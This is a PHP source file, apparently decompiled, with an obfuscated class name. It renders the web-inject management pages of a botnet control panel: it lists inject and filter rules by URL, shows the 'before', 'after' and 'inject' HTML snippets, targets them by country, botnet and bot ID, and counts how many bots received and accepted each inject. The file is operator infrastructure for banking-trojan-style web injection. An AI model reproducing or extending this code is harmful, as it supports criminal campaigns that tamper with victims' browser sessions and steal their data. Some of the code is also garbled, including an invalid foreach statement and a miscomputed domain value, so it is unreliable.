<?php


class vmcjtgi
{
	static public function editForm($webinj)
	{
		echo '      <div style="float: left; padding-bottom: 10px">' . "\r\n" . '      <input type="button" value="Upload file" class="btn btn-primary btn-sm" onclick="$(\'#selector\').click()"> ' . "\r\n" . '      <input type="file" id="selector" style="display: none" onchange="readFile(\'selector\', \'output\')">' . "\r\n" . '      <input type="button" value="Save to file" class="btn btn-primary btn-sm" onclick="document.location.href=\'?m=inj&msub=txt&id=';
		echo $webinj->id;
		echo '\'">' . "\r\n" . '      </div>' . "\r\n" . '      ';

		if ($webinj->id) {
			echo '<div style="float: right"><a href=?m=inj&msub=bots&id=' . $webinj->id . '>Sended: ' . $webinj->sended . ', accepted: ' . $webinj->accepted . '</a></div>';
		}

		echo '      ' . "\r\n" . '      <input type="hidden" name="type" value="';
		echo $webinj->type;
		echo '">' . "\r\n" . '      <div style="clear:both"></div>' . "\r\n" . '      <textarea name="data" style="width: 100%; height: 500px" id="output">';
		echo htmlspecialchars($webinj->data);
		echo '</textarea>' . "\r\n" . '    </form>' . "\r\n" . '    ';
	}

	static public function saveMsg($state, $msg = NULL)
	{
		echo '    <div class="panel panel-';
		echo $state ? 'success' : 'danger';
		echo '" style="width: 500px">' . "\r\n" . '    <div class="panel-heading"><h3 class="panel-title">';
		echo $state ? 'Success' : 'Error';
		echo '</h3></div>' . "\r\n" . '  ' . "\t" . '<div class="panel-body">';
		echo $state ? 'Update success' : 'Couldn\'t save data';
		echo '<br>';
		echo $msg;
		echo '</div></div>' . "\r\n" . '    ';
	}

	static public function extendForm($webinj)
	{
		$form = "\r\n" . '    <b>Filters</b><br>' . "\r\n" . '    <form action="?m=inj&msub=edit&id=' . $webinj->id . '" method="post" class="form-group-sm" style="margin-top: 5px">' . '<input type="hidden" id="with_reset" name="with_reset" value="0">' . '<span>Name:</span>' . '<input type="text" name="name" value="' . htmlspecialchars($webinj->name) . '" class="form-control">' . '<span>Status:</span>' . makeSelectItem('status', array('Disabled', 'Active'), (int) $webinj->status, false, true) . '<span>Countries:</span>' . makeSelectItem('countries', getCountriesList(), $webinj->countries, false, false, 'ms_country') . '<span>Botnets:</span>' . makeSelectItem('botnets', getBotnetList(), $webinj->botnets, false, false, 'ms_botnet') . '<span>Bots:</span>' . '<input type="text" name="bots" value="' . htmlspecialchars($webinj->bots) . '" class="form-control">' . '<br>' . "\r\n" . '    <input type="submit" value="Load ' . $webinj->type . '" class="btn btn-success btn-sm">' . "\r\n" . '    <input type="submit" value="Load with reset" class="btn btn-primary btn-sm" onclick="document.getElementById(\'with_reset\').value=1">' . "\r\n" . '    ';
		return $form;
	}

	static public function filterForm($filter)
	{
		$filterHtml = "\r\n" . '      <b>Filters</b><br>' . "\r\n" . '      <form class="form-group-sm" id="filter" style="margin-top: 5px">' . "\r\n" . '  ' . "\t" . '  <input type="hidden" name="m" value="inj"' . "\t" . ' />' . '<span>Type:</span>' . makeSelectItem('type', array('filter' => 'Filters', 'inject' => 'Injects'), $filter['type'], true, true) . '<span>Url:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'url', htmlEntitiesEx($filter['url']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Filter action:</span>' . makeSelectItem('action', Webinj::listActions(), $filter['action'], true, true) . '<br>' . "\r\n" . '      <input type="submit" value="Accept" class="btn btn-primary btn-sm" />' . "\r\n" . '      <input type="button" class="btn btn-danger btn-sm" value="Reset form" onclick="location.href=\'?m=inj\'" />' . "\r\n" . '      </form>';
		return $filterHtml;
	}

	static public function preview($data)
	{
		if (count($data) == 0) {
			print('No data');
			return NULL;
		}

		$gid = $lid = 0;

		foreach ($data as $group => ) {
			$domain = count($data);
			$gid++;
			$count = 0;

			if (array_key_exists('filter', $group)) {
				$count += count($group['filter']);
			}

			if (array_key_exists('inject', $group)) {
				$count += count($group['inject']);
			}

			echo '      <div style="padding-bottom: 8px">      ' . "\r\n" . '      <b><a href="javascript:$(\'#divgid';
			echo $gid;
			echo '\').toggle(\'fast\')">';
			echo htmlspecialchars($domain);
			echo ' +';
			echo $count;
			echo '</a></b>' . "\r\n" . '      <div id="divgid';
			echo $gid;
			echo '" style="display: none">' . "\r\n" . '      ';

			if (array_key_exists('filter', $group)) {
				print('<div style="padding: 8px"><b>Filters:</b><br>');

				foreach ($group['filter'] as $filter) {
					$lid++;
					@print('<u>' . Webinj::listActions()[$filter['action']] . '</u>: <code>' . htmlspecialchars($filter['url']) . '</code><br>');
				}

				print('</div>');
			}

			if (array_key_exists('inject', $group)) {
				print('<div style="padding: 8px"><b>Injects:</b><br>');

				foreach ($group['inject'] as $inject) {
					$lid++;
					print('<u>' . implode(', ', Webinj::optionsFromStr($inject['options'])) . '</u>: <code>' . htmlspecialchars($inject['url']) . '</code> ' . "\r\n" . '          <a href="javascript:$(\'#divlid' . $lid . '\').toggle(\'fast\')">+view</a>');
					print('<div style="padding: 8px"><div style="display: none" id="divlid' . $lid . '">');

					if (strlen($inject['before'])) {
						print('Before <pre>' . htmlspecialchars($inject['before']) . '</pre>');
					}

					if (strlen($inject['after'])) {
						print('After <pre>' . htmlspecialchars($inject['after']) . '</pre>');
					}

					if (strlen($inject['inject'])) {
						print('Inject <pre>' . htmlspecialchars($inject['inject']) . '</pre>');
					}

					print('</div></div>');
				}

				print('</div>');
			}

			echo '      </div>' . "\r\n\r\n" . '      </div>' . "\r\n" . '      ';
		}
	}

	static public function listAll($data)
	{
		echo '<script>' . jsCheckAll('wform', 'checkall', 'wlist[]') . '</script>';
		echo '<form action="?m=inj&msub=action" method="post" name="wform" id="wform"><input type="hidden" name="action" value="" id="waction">';
		echo '<table style="width: 100%" class="table table-striped table-bordered table-hover"><tr>' . "\r\n" . '          <th width="10px"><input id="checkall" type="checkbox" onchange="checkAll()"></th>' . "\r\n" . '          <th>Priority</th>' . "\r\n" . '          <th>Type</th>' . "\r\n" . '          <th>Name</th>' . "\r\n" . '          <th>Status</th>' . "\r\n" . '          <th>Sended</th>' . "\r\n" . '          <th>Accepted</th></tr>';

		foreach ($data as $webinj) {
			echo '<tr>' . "\r\n" . '            <td><input type=checkbox name=wlist[] value="' . $webinj->id . '"></td>' . "\r\n" . '            <td>' . $webinj->id . '</td>' . "\r\n" . '            <td>' . $webinj->type . '</td>' . "\r\n" . '            <td><a href="?m=inj&msub=edit&id=' . $webinj->id . '">' . htmlspecialchars($webinj->name) . '</a></td>' . "\r\n" . '            <td>' . ($webinj->status ? 'active' : 'disabled') . '</td>' . "\r\n" . '            <td>' . $webinj->sended . '</td>' . "\r\n" . '            <td>' . $webinj->accepted . '</td>' . "\r\n" . '            </tr>';
		}

		echo '</table></form>';
	}

	static public function listButtons()
	{
		echo '    <span>Web list:</span><br>' . "\r\n" . '    <input type="button" class="btn btn-sm btn-success" value="Load Inj" onclick="document.location.href=\'?m=inj&msub=edit&type=inj\'">' . "\r\n" . '    <input type="button" class="btn btn-sm btn-success" value="Load WebF" onclick="document.location.href=\'?m=inj&msub=edit&type=filter\'">' . "\r\n" . '    <input type="button" class="btn btn-sm btn-primary" value="Enable" onclick="document.getElementById(\'waction\').value=\'enable\';document.getElementById(\'wform\').submit()">' . "\r\n" . '    <input type="button" class="btn btn-sm btn-primary" value="Disable" onclick="document.getElementById(\'waction\').value=\'disable\';document.getElementById(\'wform\').submit()">' . "\r\n" . '    <input type="button" class="btn btn-sm btn-primary" value="Reset" onclick="document.getElementById(\'waction\').value=\'reset\';document.getElementById(\'wform\').submit()">' . "\r\n" . '    <input type="button" class="btn btn-sm btn-danger" value="Remove" onclick="document.getElementById(\'waction\').value=\'remove\';document.getElementById(\'wform\').submit()">' . "\r\n" . '    <br><br>' . "\r\n" . '    ';
	}

	static public function botList($dataset)
	{
		if (!count($dataset)) {
			echo 'No stat data';
			return NULL;
		}

		foreach ($dataset as $row) {
			echo '<a href=?m=botnet_bots&bots=' . htmlspecialchars($row['bot_id']) . '&ips=&used=0&online=0&smode=0&sord=0>' . $row['bot_id'] . '</a> ' . ($row['st'] ? 'accepted' : 'sended') . '<br>';
		}
	}
}


?>
